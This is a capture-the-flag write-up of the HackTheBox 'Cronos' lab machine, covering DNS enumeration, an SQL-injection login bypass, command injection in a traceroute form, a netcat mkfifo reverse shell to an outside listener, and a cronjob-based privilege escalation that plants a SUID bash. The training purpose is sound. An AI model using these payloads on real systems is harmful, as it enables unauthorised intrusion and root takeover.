---
title: "HackTheBox - Cronos"
author: Nasrallah
description: ""
date: 2023-04-25 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, cronjob, commandinjection, php, dns, subdomains, ffuf, sqli]
img_path: /assets/img/hackthebox/machines/cronos
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Cronos](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com). A medium linux box where we bypass a login page using sqli and find a command injection vulnerability that we exploit to get foothold. After that we exploit a cronjob to get root access.

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.13
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18b973826f26c7788f1b3988d802cee8 (RSA)
|   256 1ae606a6050bbb4192b028bf7fe5963b (ECDSA)
|_  256 1a0ee7ba00cc020104cda3a93f5e2220 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found three open ports, 22 running OpenSSH, 53 is DNS and 80 is an Apache http web server, all running on Ubuntu.

### Web

Let's check the web page.

![](1.png)

It's the default page for Apache, and nothing interesting can be found.

### DNS

Let's use `nslookup` to extract information from the DNS server and see if we can get a domain name.

```terminal
$ nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost.
> 10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
```

We found the domain `cronos.htb`, let's add it to `/etc/hosts` and navigate to it.

![](2.png)

We got another page this time, but still nothing useful can be found.

### ffuf

Let's fuzz for subdomains

```terminal
$ ffuf -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://cronos.htb/ -H "Host: FUZZ.cronos.htb/" -fl 380                                    
                                                                                                                                                              
        /'___\  /'___\           /'___\                                                                                                                       
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                      
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                       
          \/_/    \/_/   \/___/    \/_/                                                                                                                       
                                                                                                                                                              
       v1.4.1-dev                                                                                                                                             
________________________________________________                                                                                                              
                                                                                                                                                              
 :: Method           : GET                                                                                                                                    
 :: URL              : http://cronos.htb/                                                                                                                     
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt                                                                                   
 :: Header           : Host: FUZZ.cronos.htb/                                                                                                                 
 :: Follow redirects : false                                                                                                                                  
 :: Calibration      : false
 :: Timeout          : 10                                                      
 :: Threads          : 40        
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response lines: 380
________________________________________________
                                                                               
admin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 482ms]
```

Not until i finished the scan i realized that i could've enumerated the DNS server to get subdomains.

```terminal
$ dig axfr cronos.htb @10.10.10.13                                                                                  

; <<>> DiG 9.16.37-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 586 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Mon May 01 09:45:03 +01 2023
;; XFR size: 7 records (messages 1, bytes 203)

```

We found the subdomain `admin`, we add it to `/etc/hosts/` and navigate to it.

![](3.png)

It's a login page, i tried some default credentials and failed but managed to login using sql injection with the famous payload `' or 1=1 -- -`

![](4.png)

## **Foothold**

After login in successfully i saw that we can run traceroute, so i wasted no time and tested for command injection.

![](5.png)

Great! The web site is vulnerable, now it's time for a reverse shell, and for that i used `nc mkfifo`.

```terminal
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.17.90 9001 >/tmp/f
```

![](6.png)


## **Privilege Escalation**

Checking the `/etc/crontab` we see a cronjob running every minute.

```terminal
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

After some research i found this [documentation](https://laravel.com/docs/10.x/scheduling#scheduling-artisan-commands) about scheduled tasks in Laravel.

The scheduled tasks can be found in `app/Console/Kernel.php` file.

```php
<?php                                                                                                                                                         
                                                                                                                                                              
namespace App\Console;                                                                                                                                        
                                                                                                                                                              
use Illuminate\Console\Scheduling\Schedule;                                                                                                                   
use Illuminate\Foundation\Console\Kernel as ConsoleKernel;                                                                                                    
                                                                                                                                                              
class Kernel extends ConsoleKernel                                                                                                                            
{                                                                                                                                                             
    /**                                                                                                                                                       
     * The Artisan commands provided by your application.                                                                                                     
     *                                                                                                                                                        
     * @var array                                                                                                                                             
     */                                                                                                                                                       
    protected $commands = [                                                                                                                                   
        //                                                                                                                                                    
    ];                                                                                                                                                        
                                                                                                                                                              
    /**                                                                                                                                                       
     * Define the application's command schedule.                                                                                                             
     *
     * @param  \Illuminate\Console\Scheduling\Schedule  $schedule
     * @return void
     */
    protected function schedule(Schedule $schedule)
    {
        // $schedule->command('inspire')
        //          ->hourly();
    }

    /**
    * Register the Closure based commands for the application.
     *
     * @return void
     */
    protected function commands()
    {
        require base_path('routes/console.php');
    }
}
```

At the very bottom we see the routes/console.php file being called.

As user `www-data` we have control over that file, so we can change it to execute something malicious. In this case, I'll edit `console.php` to run the following code.

```php
<?php shell_exec('cp /bin/bash /tmp/bash && chmod +s /tmp/bash'); ?>
```

This will create a copy on bash in /tmp and give it suid permission so i can run it as root.

![](7.png)

And we got root!

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).